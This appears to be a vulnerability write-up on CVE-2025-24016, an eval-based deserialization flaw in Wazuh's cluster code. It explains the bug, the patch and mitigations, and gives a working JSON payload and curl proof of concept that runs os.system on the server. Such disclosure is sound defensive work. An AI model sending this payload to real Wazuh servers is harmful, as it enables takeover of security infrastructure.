# CVE-2025-24016: Unsafe Deserialization in Wazuh â€“ RCE

![Banner](banner.png)

## Description
Open-source Security Information and Event Management (SIEM) platform Wazuh suffers from CVE-2025-24016, which enables attackers to execute arbitrary code remotely on their servers.

Attackers who have API access can execute arbitrary Python commands on vulnerable servers through this vulnerability, which exists from version 4.4.0 up to 4.9.0. The `as_wazuh_object` function processes DistributedAPI (DAPI) request or response data that makes the vulnerability active. The vulnerability enables attackers to execute arbitrary Python code, resulting in system takeover, data breaches, and complete security damage to infrastructure.

The safe `ast.literal_eval` function change in version 4.9.1 enables vulnerability protection.

## Technical Breakdown

- **Affected Software:** Wazuh  
- **Affected Versions:** 4.4.0 to 4.9.0  
- **CVSSv3.1 Score:** 9.9 (Critical)  
- **CVSSv3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H`  
- **Affected Component:** `framework/wazuh/core/cluster/common.py`  
- **Attack Vector:** Network  
- **Privileges Required:** Low (API Access)  
- **User Interaction:** None  
- **Scope:** Changed  

The security problem resides inside the `as_wazuh_object` function within `framework/wazuh/core/cluster/common.py`. DAPI data serialization occurs through this function to process JSON data used for communication between Wazuh API, manager, and agents.

### Vulnerable Code
```python
def as_wazuh_object(dct: Dict):
    try:
        if '__wazuh_datetime__' in dct:
            return datetime.datetime.fromisoformat(dct['__wazuh_datetime__'])
        elif '__unhandled_exc__' in dct:
            exc_data = dct['__unhandled_exc__']
            return eval(exc_data['__class__'])(*exc_data['__args__']) # ðŸš¨ VULNERABLE ðŸš¨
        return dct
    except (KeyError, AttributeError):
        return dct
```

The code checks if the dictionary `dct` contains the key `__unhandled_exc__`. A valid dictionary value for `__unhandled_exc__` enables the code to obtain class and args values before implementing `eval` to create an instance of `__class__` with arguments `__args__`. Evaluating untrusted data means exposing the system to severe Python code execution since attackers control it.

## Affected Component Analysis
CVE-2025-24016 occurs because `eval` operates on every data string received from the Distributed API for serialization. Pythonâ€™s evaluation functions enable arbitrary program execution, creating a major security threat.

### Exploitation Example
An attacker can send the following JSON payload:
```json
{
    "__unhandled_exc__": {
        "__class__": "os.system",
        "__args__": ["touch /tmp/pwn.txt"]
    }
}
```
The execution of `eval` within `as_wazuh_object` produces a system call of `os.system("touch /tmp/pwn.txt")`, leading to the creation of a file named `/tmp/pwn.txt` on the Wazuh server.

### Proof-of-Concept (PoC) Exploit
```sh
curl -X POST -k -u "wazuh-wui:MyS3cr37P450r.*-" -H "Content-Type: application/json" \  
--data '{"__unhandled_exc__":{"__class__": "os.system", "__args__": ["touch /tmp/pwn.txt"]}}' \  
https://<worker-server>:55000/security/user/authenticate/run_as
```

### Attack Capabilities
- **Full system control** â€“ Attackers can install malware, modify configurations, or exfiltrate sensitive data.
- **Lateral movement** â€“ The compromised Wazuh server can be used for spreading across networks.
- **Monitoring disruption** â€“ Security alerts can be disabled, allowing attackers to operate undetected.

## Patch Analysis
Wazuh resolved this vulnerability in version 4.9.1 by replacing `eval` with `ast.literal_eval`, which securely evaluates literals without allowing arbitrary code execution.

### Fixed Code
```python
        elif '__unhandled_exc__' in dct:
            exc_data = dct['__unhandled_exc__']
-            return eval(exc_data['__class__'])(*exc_data['__args__'])
+            exc_dict = {exc_data['__class__']: exc_data['__args__']}
+            return ast.literal_eval(json.dumps(exc_dict))
        return dct
```
The patch mitigates the vulnerability by replacing the unsafe `eval` function with `ast.literal_eval`. Unlike `eval`, `ast.literal_eval` only processes Python literals, eliminating arbitrary code execution risks.

## Mitigation Strategies
To reduce the risk associated with this vulnerability, organizations should implement the following security measures:

- **Upgrade to Wazuh 4.9.1 or later** â€“ This version includes the necessary patch to fix the vulnerability.
- **Restrict API access** â€“ Limit API usage to only authorized users and trusted systems.
- **Temporary workarounds** â€“ Deploy Web Application Firewalls (WAFs) to block requests containing `__unhandled_exc__`.
- **Monitor API traffic** â€“ Continuously track API activity for unusual behavior, such as unexpected requests or large data transfers.
- **Regularly update security configurations** â€“ Ensure that Wazuh security settings are current and properly configured.
